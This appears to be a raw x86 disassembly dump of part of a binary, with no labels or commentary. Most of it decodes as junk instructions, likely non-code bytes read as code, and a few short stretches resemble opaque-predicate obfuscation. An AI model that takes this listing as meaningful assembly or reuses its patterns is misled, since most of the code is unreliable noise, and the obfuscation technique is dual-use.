  40ba84:	fnstenv [edi+0x4d]
  40ba87:	dec    esi
  40ba88:	test   al,0xad
  40ba8a:	jecxz  0x40bab4
  40ba8c:	xchg   ebx,eax
  40ba8d:	mov    eax,0x4a32d3e0
  40ba92:	lods   al,BYTE PTR ds:[esi]
  40ba93:	jb     0x40ba1d
  40ba95:	test   BYTE PTR es:[edi-0x4c],dh
  40ba99:	pushf  
  40ba9a:	inc    eax
  40ba9b:	js     0x40bad3
  40ba9d:	dec    ebp
  40ba9e:	cmc    
  40ba9f:	mov    ebx,0x3faed2f2
  40baa4:	mov    bl,0x67
  40baa6:	xor    dl,BYTE PTR [ebp+0x13]
  40baa9:	mov    es,WORD PTR [ecx]
  40baab:	outs   dx,DWORD PTR ds:[esi]
  40baac:	cmp    edx,esi
  40baae:	xor    eax,0x7567eb38
  40bab3:	sbb    BYTE PTR [edx+0x7f],al
  40bab6:	mov    edx,0x4672f6cb
  40babb:	popa   
  40babc:	xchg   dl,dh
  40babe:	xchg   ecx,eax
  40babf:	pop    ss
  40bac0:	mov    ebp,DWORD PTR [ecx-0x67]
  40bac3:	xchg   edi,eax
  40bac4:	mov    DWORD PTR [ebp+eax*8-0x73d6982],edx
  40bacb:	(bad)  
  40bacc:	fiadd  DWORD PTR [edi-0x7d]
  40bacf:	ja     0x40ba9e
  40bad1:	fcom   st(4)
  40bad3:	leave  
  40bad4:	sbb    eax,0x93a5ef2
  40bad9:	mov    al,0xea
  40badb:	xchg   ebx,eax
  40badc:	out    dx,al
  40badd:	sti    
  40bade:	xor    al,0x94
  40bae0:	inc    ecx
  40bae1:	loope  0x40bb1f
  40bae3:	mov    dh,0x85
  40bae5:	xchg   edi,eax
  40bae6:	arpl   WORD PTR [edi],dx
  40bae8:	ds dec ecx
  40baea:	jno    0x40bab1
  40baec:	inc    ebp
  40baed:	dec    ebx
  40baee:	push   edi
  40baef:	leave  
  40baf0:	out    0x62,al
  40baf2:	sub    eax,0x47a016b1
  40baf7:	sti    
  40baf8:	mov    dl,0x6d
  40bafa:	jo     0x40baec
  40bafc:	data16 rol dl,0x9b
  40bb00:	inc    ecx
  40bb01:	dec    edi
  40bb02:	std    
  40bb03:	test   DWORD PTR [ebx+0x4cd47752],ebp
  40bb09:	or     edx,DWORD PTR [eax+edx*8+0x38]
  40bb0d:	jo     0x40bad1
  40bb0f:	outs   dx,BYTE PTR ds:[esi]
  40bb10:	xor    ecx,DWORD PTR [edx+ebx*8]
  40bb13:	inc    ebp
  40bb14:	cs mov ah,0x20
  40bb17:	cmp    eax,0x14985c3a
  40bb1c:	adc    DWORD PTR [eax],eax
  40bb1e:	test   al,0x4e
  40bb20:	jae    0x40bb60
  40bb22:	xchg   ecx,eax
  40bb23:	dec    edi
  40bb24:	inc    ecx
  40bb25:	lahf   
  40bb26:	push   cs
  40bb27:	push   ebx
  40bb28:	enter  0xa732,0x39
  40bb2c:	jmp    0x21c9861c
  40bb31:	repnz fwait
  40bb33:	das    
  40bb34:	sbb    ebp,DWORD PTR [edi+edx*8-0x4c6f37c0]
  40bb3b:	test   al,0x17
  40bb3d:	ds jmp 0x739a:0xc869ca63
  40bb45:	xchg   edx,eax
  40bb46:	test   DWORD PTR [ebp-0x36],ecx
  40bb49:	xor    cl,al
  40bb4b:	jge    0x40bb69
  40bb4d:	loop   0x40bb4a
  40bb4f:	das    
  40bb50:	inc    DWORD PTR [esi+esi*4]
  40bb53:	enter  0xcff9,0xb8
  40bb57:	lds    eax,FWORD PTR [edi+0x3b6b6c5e]
  40bb5d:	ds in  al,0xdd
  40bb60:	fwait
  40bb61:	in     al,0xb2
  40bb63:	mov    cl,0x78
  40bb65:	sbb    BYTE PTR [edi+edx*4-0x51],cl
  40bb69:	dec    esi
  40bb6a:	mov    bh,0xf9
  40bb6c:	mov    WORD PTR [edi],cs
  40bb6e:	(bad)  
  40bb6f:	lods   al,BYTE PTR ds:[si]
  40bb71:	in     eax,0x68
  40bb73:	scas   eax,DWORD PTR es:[edi]
  40bb74:	fcom   DWORD PTR [esi-0x29721d98]
  40bb7a:	or     esp,DWORD PTR [esi-0x62]
  40bb7d:	aam    0x16
  40bb7f:	mov    al,0x79
  40bb81:	sbb    BYTE PTR [eax+0xf],bl
  40bb84:	push   edi
  40bb85:	mov    ds,WORD PTR [esi]
  40bb87:	dec    esp
  40bb88:	lock leave 
  40bb8a:	loope  0x40bb4b
  40bb8c:	mov    ecx,DWORD PTR [ebp-0x6b]
  40bb8f:	pusha  
  40bb90:	jb     0x40bbb2
  40bb92:	out    0x49,al
  40bb94:	(bad)  [ebx-0x1d]
  40bb97:	rcr    BYTE PTR [esi+0x27],0xb5
  40bb9b:	je     0x40bb42
  40bb9d:	adc    DWORD PTR [eax],esi
  40bb9f:	aam    0x85
  40bba1:	lods   al,BYTE PTR ds:[esi]
  40bba2:	jb     0x40bc02
  40bba4:	and    eax,0xa4706579
  40bba9:	and    BYTE PTR [ecx-0x31ad64dd],0x96
  40bbb0:	inc    edx
  40bbb1:	and    al,0xed
  40bbb3:	xor    eax,0xb621b962
  40bbb8:	mov    esi,0xe3726999
  40bbbd:	mov    esi,0xaf18aa1e
  40bbc2:	adc    bl,bh
  40bbc4:	sub    DWORD PTR [eax],edx
  40bbc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbc7:	or     eax,0xfdcf40a4
  40bbcc:	in     al,dx
  40bbcd:	inc    edi
  40bbce:	mov    esi,0x9b191f4f
  40bbd3:	loopne 0x40bb96
  40bbd5:	ds xchg ebx,eax
  40bbd7:	lock inc ebx
  40bbd9:	mov    dl,0x19
  40bbdb:	xor    BYTE PTR [edi*8+0x638b25d2],ch
  40bbe2:	shl    BYTE PTR [esp+ebp*1+0x3d],1
  40bbe6:	xchg   ebp,eax
  40bbe7:	test   DWORD PTR [edx+0x9a87c75],eax
  40bbed:	cld    
  40bbee:	xchg   ebp,eax
  40bbef:	xlat   BYTE PTR ds:[ebx]
  40bbf0:	pop    ecx
  40bbf1:	int3   
  40bbf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbf3:	mov    ebx,DWORD PTR [esi+0x68870c7c]
  40bbf9:	inc    ebx
  40bbfa:	(bad)  
  40bbfb:	jne    0x40bc74
  40bbfd:	inc    esp
  40bbfe:	sub    eax,0xde2aac8e
  40bc03:	shl    DWORD PTR [ebp-0x76],1
  40bc06:	cld    
  40bc07:	xchg   ecx,eax
  40bc08:	lahf   
  40bc09:	test   eax,0xa708e099
  40bc0e:	sub    bh,BYTE PTR [eax+eax*1]
  40bc11:	push   0xbf5f13f9
  40bc16:	rcr    DWORD PTR [edi],1
  40bc18:	dec    edi
  40bc19:	sub    edi,DWORD PTR [ebp-0x6a953cda]
  40bc1f:	icebp  
  40bc20:	addr16 push esp
  40bc22:	dec    esi
  40bc23:	adc    al,0xa6
  40bc25:	mov    ds:0xbc103a6d,eax
  40bc2a:	inc    edx
  40bc2b:	dec    eax
  40bc2c:	loopne 0x40bbff
  40bc2e:	and    BYTE PTR [edx],ah
  40bc30:	aam    0xb1
  40bc32:	push   esp
  40bc33:	cmp    al,0xee
  40bc35:	outs   dx,DWORD PTR ds:[esi]
  40bc36:	or     dl,dh
  40bc38:	xor    eax,0x1de82383
  40bc3d:	mov    esi,DWORD PTR ds:0xc8243ae9
  40bc43:	sahf   
  40bc44:	mov    eax,0x4bc1f4e4
  40bc49:	sub    dl,ch
  40bc4b:	sbb    ebx,esi
  40bc4d:	mov    ds:0x68bfdf42,eax
  40bc52:	outs   dx,DWORD PTR ds:[esi]
  40bc53:	sbb    eax,esp
  40bc55:	mov    esi,0xe5144b8b
  40bc5a:	leave  
  40bc5b:	in     al,0x95
  40bc5d:	cmp    eax,DWORD PTR [ecx-0x4a]
  40bc60:	stc    
  40bc61:	dec    edi
  40bc62:	jns    0x40bc53
  40bc64:	dec    ebp
  40bc65:	retf   0x5868
  40bc68:	leave  
  40bc69:	add    al,0x6e
  40bc6b:	shl    DWORD PTR [ecx],1
  40bc6d:	cmp    eax,0x390e3e63
  40bc72:	aas    
  40bc73:	xlat   BYTE PTR ds:[ebx]
  40bc74:	adc    al,0x7e
  40bc76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc77:	outs   dx,BYTE PTR ds:[esi]
  40bc78:	inc    ebp
  40bc79:	test   ch,ch
  40bc7b:	repnz cli 
  40bc7d:	xchg   esp,eax
  40bc7e:	mov    ds:0x1c0d8c85,eax
  40bc83:	pop    ebx
  40bc84:	jns    0x40bc6f
  40bc86:	fist   DWORD PTR [eax]
  40bc88:	clts   
  40bc8a:	vpshab ymm3,xmm2,[esi-0x52]
  40bc90:	sahf   
  40bc91:	jmp    0x40bc25
  40bc93:	test   al,0x46
  40bc95:	mov    eax,0x57d1bdb8
  40bc9a:	inc    esp
  40bc9b:	xor    ebp,DWORD PTR [edx-0x33]
  40bc9e:	sbb    BYTE PTR [esi],bl
  40bca0:	jmp    0xdc5fc0ff
  40bca5:	sbb    ah,BYTE PTR [esi]
  40bca7:	push   esi
  40bca8:	mov    cl,0x1e
  40bcaa:	inc    esi
  40bcab:	fild   QWORD PTR ds:0x92797fe7
  40bcb1:	or     cl,BYTE PTR [ebp-0x4e710ca2]
  40bcb7:	imul   ebx,DWORD PTR [ecx],0x1f5e4c92
  40bcbd:	inc    ecx
  40bcbe:	(bad)  
  40bcbf:	(bad)
  40bcc2:	dec    ecx
  40bcc3:	dec    esp
  40bcc4:	jmp    0xcc22:0xe8540bf1
  40bccb:	pop    edx
  40bccc:	dec    ecx
  40bccd:	inc    ebp
  40bcce:	or     al,0x51
  40bcd0:	add    eax,0x2164f1d7
  40bcd5:	pop    esi
  40bcd6:	cmp    al,BYTE PTR [eax-0x2e]
  40bcd9:	out    0xaa,al
  40bcdb:	xchg   ebp,eax
  40bcdc:	and    cl,bh
  40bcde:	mov    dh,0x80
  40bce0:	and    bh,al
  40bce2:	pop    ebx
  40bce3:	test   BYTE PTR [ebp-0x40],0x51
  40bce7:	or     al,0x6d
  40bce9:	neg    ebp
  40bceb:	jno    0x40bce2
  40bced:	cli    
  40bcee:	or     DWORD PTR [esp+eiz*8-0x74966d84],0x5d
  40bcf6:	lock sub ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    ah,BYTE PTR [eax-0x59]
  40bd40:	pop    eax
  40bd41:	mov    bl,0x8f
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd6e
  40bd4b:	jl     0x40bd63
  40bd4d:	xlat   BYTE PTR ds:[ebx]
  40bd4e:	adc    eax,DWORD PTR [edi]
  40bd50:	push   edx
  40bd51:	arpl   WORD PTR [edi-0x8d25ada],dx
  40bd57:	pop    ebx
  40bd58:	hlt    
  40bd59:	xchg   bl,ch
  40bd5b:	rcl    DWORD PTR ds:[ecx],cl
  40bd5e:	push   edi
  40bd5f:	fsubrp st(2),st
  40bd61:	jne    0x40bd0c
  40bd63:	fs push 0xffffff91
  40bd66:	retf   0xc375
  40bd69:	mov    eax,ecx
  40bd6b:	cmp    BYTE PTR [ebp+esi*8+0x5a7d3ffa],bl
  40bd72:	fadd   QWORD PTR [ecx-0xc]
  40bd75:	push   edi
  40bd76:	jmp    0x3a60169c
  40bd7b:	mov    edx,0x18573f6b
  40bd80:	add    BYTE PTR ds:0xe5e0b213,al
  40bd86:	inc    edx
  40bd87:	jp     0x40bd3e
  40bd89:	(bad)  
  40bd8a:	das    
  40bd8b:	mov    dh,0xa6
  40bd8d:	push   ebx
  40bd8e:	aam    0x1c
  40bd90:	mov    cs,ebp
  40bd92:	jnp    0x40bdc5
  40bd94:	sub    al,0x70
  40bd96:	test   eax,0xdffee73c
  40bd9b:	imul   eax,DWORD PTR [ebx+eiz*2-0x6d],0xffffff98
  40bda0:	cdq    
  40bda1:	das    
  40bda2:	mov    ds:0xba5c0550,al
  40bda7:	lea    esi,[ecx+edx*2-0x5021919a]
  40bdae:	loope  0x40bd38
  40bdb0:	inc    edx
  40bdb1:	mov    ebx,DWORD PTR [eax-0xe]
  40bdb4:	and    al,BYTE PTR [ecx+0x6f5c4429]
  40bdba:	cs or  eax,0x283a08ae
  40bdc0:	ror    DWORD PTR [ebp+0xeea736a],1
  40bdc6:	and    al,bl
  40bdc8:	rcr    BYTE PTR ds:0xdd2e5d95,1
  40bdce:	pop    esp
  40bdcf:	std    
  40bdd0:	pop    edi
  40bdd1:	push   ss
  40bdd2:	push   edx
  40bdd3:	jo     0x40bdec
  40bdd5:	push   ss
  40bdd6:	stc    
  40bdd7:	dec    eax
  40bdd8:	dec    ebx
  40bdd9:	jmp    0x396d6685
  40bdde:	iret   
  40bddf:	xchg   esp,eax
  40bde0:	sahf   
  40bde1:	jo     0x40be5c
  40bde3:	outs   dx,DWORD PTR ds:[esi]
  40bde4:	add    esi,ecx
  40bde6:	std    
  40bde7:	add    ebp,edi
  40bde9:	fmul   DWORD PTR ds:0x28410d13
  40bdef:	xor    DWORD PTR [esi+0x57],ebx
  40bdf2:	sbb    eax,0x2bb8fe38
  40bdf7:	(bad)  
  40bdf8:	jns    0x40bd93
  40bdfa:	js     0x40be6f
  40bdfc:	in     eax,dx
  40bdfd:	clc    
  40bdfe:	daa    
  40bdff:	add    DWORD PTR cs:[edi+0x3ea1e080],edi
  40be06:	xor    al,BYTE PTR [eax]
  40be08:	pop    esi
  40be09:	jle    0x40bdba
  40be0b:	pop    edi
  40be0c:	cmp    BYTE PTR [bp+si+0x1534],al
  40be11:	adc    al,0x1e
  40be13:	jo     0x40bdc9
  40be15:	in     al,0x0
  40be17:	rol    BYTE PTR [ebp+0x7bc0ea67],1
  40be1d:	es dec esp
  40be1f:	scas   al,BYTE PTR es:[edi]
  40be20:	scas   al,BYTE PTR es:[edi]
  40be21:	xor    edx,DWORD PTR [eax-0x6460e5a9]
  40be27:	push   esp
  40be28:	mov    eax,ds:0xe9997874
  40be2d:	adc    DWORD PTR [ecx],eax
  40be2f:	scas   eax,DWORD PTR es:[edi]
  40be30:	std    
  40be31:	aam    0x0
  40be33:	mov    DWORD PTR [esp+eax*1+0x21],esp
  40be37:	pop    ebp
  40be38:	out    0x7d,eax
  40be3a:	dec    ecx
  40be3b:	repnz xchg esp,eax
  40be3d:	icebp  
  40be3e:	sbb    al,0x77
  40be40:	add    ecx,DWORD PTR gs:[esi]
  40be43:	aas    
  40be44:	ret    
  40be45:	cmp    BYTE PTR [edi-0x13427a81],bh
  40be4b:	or     al,0xa4
  40be4d:	xchg   edi,eax
  40be4e:	adc    cl,dl
  40be50:	retf   
  40be51:	mov    al,ds:0xd8617ab
  40be56:	idiv   bh
  40be58:	fnsave [ecx+0x6a52dcaf]
  40be5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be5f:	push   0x1cae6a19
  40be64:	or     bl,cl
  40be66:	sub    eax,0xc3cba0a4
  40be6b:	adc    DWORD PTR ds:0x958a5f0b,ebx
  40be71:	fimul  DWORD PTR [ecx-0x606f8b3a]
  40be77:	pop    ecx
  40be78:	or     ecx,DWORD PTR [edi+0x7]
  40be7b:	push   ebx
  40be7c:	pop    ebx
  40be7d:	out    dx,eax
  40be7e:	cmp    al,0x45
  40be80:	fs inc bl
  40be83:	xchg   ebx,eax
  40be84:	xchg   ebx,eax
  40be85:	cmp    al,0xa5
  40be87:	rcl    dl,1
  40be89:	push   ds
  40be8a:	jo     0x40be3b
  40be8c:	xor    eax,0x2e14219b
  40be91:	push   edx
  40be92:	popa   
  40be93:	push   0xffffffba
  40be95:	movd   mm5,DWORD PTR [esi+0x76]
  40be99:	ja     0x40be99
  40be9b:	push   0x73
  40be9d:	ja     0x40beab
  40be9f:	push   edx
  40bea0:	push   ss
  40bea1:	sub    eax,0x363fa16
  40bea6:	mov    ebp,0x8fd54b18
  40beab:	mov    ah,0x32
  40bead:	fdiv   QWORD PTR [ebx-0x360ef54f]
  40beb3:	xchg   ebp,edx
  40beb5:	sbb    eax,0x4eb4396e
  40beba:	shr    BYTE PTR [esi+0x1d7ddb3],1
  40bec0:	es test bh,dh
  40bec3:	in     eax,dx
  40bec4:	and    bh,BYTE PTR [edx+0x336ee261]
  40beca:	jmp    0x484ca204
  40becf:	jecxz  0x40be5a
  40bed1:	xor    BYTE PTR [edi+ebx*8+0x1f],cl
  40bed5:	push   ss
  40bed6:	clc    
  40bed7:	ss inc ebx
  40bed9:	les    ebp,FWORD PTR [esi+0x7a1e2dab]
  40bedf:	leave  
  40bee0:	in     eax,dx
  40bee1:	lods   eax,DWORD PTR ds:[esi]
  40bee2:	dec    edx
  40bee3:	outs   dx,BYTE PTR ss:[esi]
  40bee5:	outs   dx,BYTE PTR ds:[esi]
  40bee6:	push   ebx
  40bee7:	shl    BYTE PTR [ebp-0x51],1
  40beea:	int3   
  40beeb:	loopne 0x40bef5
  40beed:	in     eax,dx
  40beee:	repz sbb BYTE PTR [ecx+ebp*8-0x31],ah
  40bef3:	cmp    dl,BYTE PTR [ecx]
  40bef5:	push   ebx
  40bef6:	mov    edi,0xd69f7e4
  40befb:	or     BYTE PTR [esi-0x2c],ch
  40befe:	mov    edi,0xa95a23b5
  40bf03:	push   ebp
  40bf04:	jnp    0x40bf35
  40bf06:	pop    es
  40bf07:	ins    DWORD PTR es:[edi],dx
  40bf08:	fcom   st(4)
  40bf0a:	cld    
  40bf0b:	and    ebp,DWORD PTR [eax+0x79361296]
  40bf11:	jg     0x40bee6
  40bf13:	xchg   DWORD PTR [ebp-0x1ebe3380],edx
  40bf19:	fmul   QWORD PTR [esi]
  40bf1b:	es pop esi
  40bf1d:	dec    ebp
  40bf1e:	push   eax
  40bf1f:	sti    
  40bf20:	jb     0x40bf2f
  40bf22:	cli    
  40bf23:	or     BYTE PTR fs:[eax-0x6f],0xab
  40bf28:	sub    al,cl
  40bf2a:	mov    eax,0xbde2a1b5
  40bf2f:	lods   al,BYTE PTR ds:[esi]
  40bf30:	test   DWORD PTR [ebx],ebp
  40bf32:	outs   dx,DWORD PTR ds:[esi]
  40bf33:	int    0x41
  40bf35:	add    ecx,ebp
  40bf37:	mov    ch,0x9e
  40bf39:	add    al,0x7f
  40bf3b:	push   cs
  40bf3c:	aas    
  40bf3d:	push   ecx
  40bf3e:	and    DWORD PTR [ebp+0x21],esi
  40bf41:	inc    ebx
  40bf42:	jl     0x40bf13
  40bf44:	cli    
  40bf45:	test   eax,0xf1143910
  40bf4a:	icebp  
  40bf4b:	and    eax,0xa38ae365
  40bf50:	pop    eax
  40bf51:	(bad)  
  40bf52:	adc    ecx,0x34
  40bf55:	(bad)  
  40bf56:	jg     0x40bfb6
  40bf58:	push   edx
  40bf59:	es push cs
  40bf5b:	call   0x40b0:0x7ef00373
  40bf62:	retf   
  40bf63:	fcmovu st,st(1)
  40bf65:	or     DWORD PTR [ecx],esi
  40bf67:	fldcw  WORD PTR [esi+0x3b]
  40bf6a:	rcr    DWORD PTR [edi+0x56],1
  40bf6d:	jo     0x40bfe9
  40bf6f:	call   0x6750bdf1
  40bf74:	cmp    eax,0x3392f98d
  40bf79:	add    DWORD PTR [edi-0x43],ebx
  40bf7c:	clc    
  40bf7d:	adc    al,BYTE PTR [eax+0x22]
  40bf80:	sub    BYTE PTR [esi+0x2052e736],cl
  40bf86:	fidivr WORD PTR [edx+0x34282b4b]
  40bf8c:	out    0xe5,eax
  40bf8e:	and    ebx,esp
  40bf90:	ret    0x1a16
  40bf93:	mov    esp,0x3eba619b
  40bf98:	adc    DWORD PTR [eax+edi*8],edx
  40bf9b:	jg     0x40bf41
  40bf9d:	popf   
  40bf9e:	ins    DWORD PTR es:[edi],dx
  40bf9f:	cmp    eax,0x5e4d148d
  40bfa4:	inc    esp
  40bfa5:	cmp    DWORD PTR [ecx+ecx*2+0x3c],0x3c
  40bfaa:	ret    
  40bfab:	pop    edx
  40bfac:	and    edi,esi
  40bfae:	fisub  WORD PTR [eax]
  40bfb0:	jg     0x40bfd7
  40bfb2:	adc    eax,0x2851ea9f
  40bfb7:	pop    edx
  40bfb8:	scas   al,BYTE PTR es:[edi]
  40bfb9:	cmp    edi,DWORD PTR [ecx-0x4dda228]
  40bfbf:	ins    DWORD PTR es:[edi],dx
  40bfc0:	outs   dx,DWORD PTR ds:[esi]
  40bfc1:	jecxz  0x40bfc7
  40bfc3:	call   0x5f5d:0xe31631e
  40bfca:	xor    DWORD PTR [ebx+0x3147a9e0],0x67
  40bfd1:	lods   eax,DWORD PTR ds:[esi]
  40bfd2:	into   
  40bfd3:	loopne 0x40bf6f
  40bfd5:	std    
  40bfd6:	fisub  WORD PTR [ebx]
  40bfd8:	lahf   
  40bfd9:	in     al,0x1d
  40bfdb:	and    eax,0xf89f7627
  40bfe0:	push   ebx
  40bfe1:	xor    al,BYTE PTR [edx+0x482afd99]
  40bfe7:	sbb    eax,0xd5b71610
  40bfec:	outs   dx,DWORD PTR ds:[esi]
  40bfed:	add    edi,eax
  40bfef:	enter  0xaa91,0x4
  40bff3:	mov    dl,0xd5
  40bff5:	and    eax,0xa339bd2e
  40bffa:	mov    ?,WORD PTR [bx+di]
  40bffd:	mov    al,0xac
  40bfff:	inc    ecx
  40c000:	ins    DWORD PTR es:[edi],dx
  40c001:	jns    0x40c069
  40c003:	inc    ebp
  40c004:	inc    edi
  40c005:	mov    eax,ds:0x5ae5932a
  40c00a:	pop    esi
  40c00b:	dec    edx
  40c00c:	mov    bh,0x3d
  40c00e:	popa   
  40c00f:	jp     0x40bfd9
  40c011:	aaa    
  40c012:	je     0x40bffc
  40c014:	push   ds
  40c015:	xchg   ebx,eax
  40c016:	clc    
  40c017:	mov    ebp,0xde001fe1
  40c01c:	ins    BYTE PTR es:[edi],dx
  40c01d:	icebp  
  40c01e:	popa   
  40c01f:	mov    edi,0x686e3a9b
  40c024:	or     eax,0xf0ebc8dd
  40c029:	fld    st(4)
  40c02b:	out    dx,eax
  40c02c:	icebp  
  40c02d:	sbb    eax,DWORD PTR [ecx]
  40c02f:	or     BYTE PTR [ebx-0x2f6932ab],ch
  40c035:	cmp    ecx,DWORD PTR [eax-0x7d]
  40c038:	enter  0xdd12,0x7e
  40c03c:	mov    gs,WORD PTR [esi-0x5f]
  40c03f:	xor    DWORD PTR [eax],eax
  40c041:	out    dx,al
  40c042:	pusha  
  40c043:	shl    DWORD PTR [eax-0x5a],cl
  40c046:	push   es
  40c047:	(bad)  
  40c048:	aas    
  40c049:	pop    eax
  40c04a:	out    dx,al
  40c04b:	xor    BYTE PTR [ebx],dh
  40c04d:	add    DWORD PTR es:[ecx],eax
  40c050:	les    ecx,FWORD PTR [edx]
  40c052:	push   es
  40c053:	add    ebp,ecx
  40c055:	int3   
  40c056:	jb     0x40c0bc
  40c058:	sar    ebx,1
  40c05a:	int    0x86
  40c05c:	in     eax,0x18
  40c05e:	jae    0x40c0df
  40c060:	fstp   DWORD PTR [esi-0x140323b3]
  40c066:	int3   
  40c067:	iret   
  40c068:	or     bl,0x80
  40c06b:	cdq    
  40c06c:	arpl   WORD PTR [eax+0x33],bx
  40c06f:	adc    ebp,DWORD PTR [ebx-0x6c]
  40c072:	enter  0x83fc,0xee
  40c076:	lock sbb DWORD PTR [esp+ebp*1-0x49],ebp
  40c07b:	mov    DWORD PTR [edi+esi*4-0x7f],eax
  40c07f:	or     dh,cl
  40c081:	ror    BYTE PTR [edi-0x4872a1b7],0x68
  40c088:	add    ah,BYTE PTR [ecx-0x7a8f0dfb]
  40c08e:	cmp    al,0xf7
  40c090:	shl    cl,0x79
  40c093:	cmp    eax,edi
  40c095:	stc    
  40c096:	xchg   BYTE PTR [ecx+0x7f],bl
  40c099:	and    esp,DWORD PTR [edi-0x71]
  40c09c:	lods   eax,DWORD PTR ds:[esi]
  40c09d:	es sub BYTE PTR ds:[esi],al
  40c0a1:	mov    eax,ds:0xf2bfdd1f
  40c0a6:	outs   dx,BYTE PTR ds:[esi]
  40c0a7:	das    
  40c0a8:	pop    esi
  40c0a9:	sahf   
  40c0aa:	aam    0xf6
  40c0ac:	aas    
  40c0ad:	xor    dl,BYTE PTR ds:0xa00ce2f2
  40c0b3:	sar    BYTE PTR [edi+ebp*8-0x74a2d03a],0x6f
  40c0bb:	adc    al,0xf7
  40c0bd:	mov    WORD PTR [edx+0x274bcdaa],es
  40c0c3:	(bad)  
  40c0c4:	jmp    0x33d0e1c8
  40c0c9:	mov    al,ds:0xdf45fd6b
  40c0ce:	add    al,0x60
  40c0d0:	pop    edi
  40c0d1:	data16 out 0x0,al
  40c0d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0d5:	outs   dx,BYTE PTR ds:[esi]
  40c0d6:	lahf   
  40c0d7:	aam    0xe9
  40c0d9:	in     al,dx
  40c0da:	fmul   DWORD PTR [edi+eax*2+0x6f10fbe8]
  40c0e1:	dec    edi
  40c0e2:	mov    ecx,0xaefe5ef9
  40c0e7:	daa    
  40c0e8:	int    0xa3
  40c0ea:	adc    DWORD PTR [ebx+0x7d8bc455],ecx
  40c0f0:	cld    
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    di,WORD PTR ds:[esi]
  40c144:	push   esp
  40c145:	js     0x40c18b
  40c147:	mov    esi,DWORD PTR cs:[eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c1a4
  40c150:	xor    dh,BYTE PTR [eax]
  40c152:	lods   eax,DWORD PTR ds:[esi]
  40c153:	jo     0x40c159
  40c155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c156:	enter  0xab5d,0x6b
  40c15a:	sub    cl,BYTE PTR [ecx+0x1fd65aaf]
  40c160:	mov    dh,0xb1
  40c162:	ds inc ebx
  40c164:	mov    edx,0x4bfa4de2
  40c169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c16a:	ds xor al,0x5d
  40c16d:	xchg   edi,eax
  40c16e:	mov    ecx,0x5b0ef5c
  40c173:	pop    ebp
  40c174:	ins    DWORD PTR es:[edi],dx
  40c175:	push   ss
  40c176:	sub    bh,BYTE PTR [ebp-0x3a68e2f7]
  40c17c:	cs push edx
  40c17e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c17f:	scas   eax,DWORD PTR es:[edi]
  40c180:	or     ebp,DWORD PTR [edx]
  40c182:	fcomp  st(7)
  40c184:	jg     0x40c179
  40c186:	cvtps2pi mm6,xmm1
  40c189:	fdiv   QWORD PTR [edi-0x137e17d0]
  40c18f:	(bad)  
  40c190:	data16 outs dx,BYTE PTR ds:[esi]
  40c192:	or     DWORD PTR [esi],0xa9ed3ad9
  40c198:	dec    ebp
  40c199:	(bad)
  40c19c:	add    al,0x63
  40c19e:	xlat   BYTE PTR ds:[ebx]
  40c19f:	inc    eax
  40c1a0:	pop    eax
  40c1a1:	sub    BYTE PTR [edi+eax*8+0x56],al
  40c1a5:	retf   
  40c1a6:	xchg   edi,eax
  40c1a7:	lods   al,BYTE PTR ds:[esi]
  40c1a8:	nop
  40c1a9:	fidiv  DWORD PTR [edx]
  40c1ab:	xchg   edi,eax
  40c1ac:	add    bh,al
  40c1ae:	imul   ebx,DWORD PTR [esp+ebp*1+0x5c],0xa425ac94
  40c1b6:	test   BYTE PTR [esp+edx*8+0x2a23b417],cl
  40c1bd:	aad    0x78
  40c1bf:	leave  
  40c1c0:	les    ebx,FWORD PTR [eax+0x54260f43]
  40c1c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1c7:	push   edi
  40c1c8:	cmc    
  40c1c9:	sbb    DWORD PTR [esi+0xa2d835d],edx
  40c1cf:	inc    esp
  40c1d0:	dec    ecx
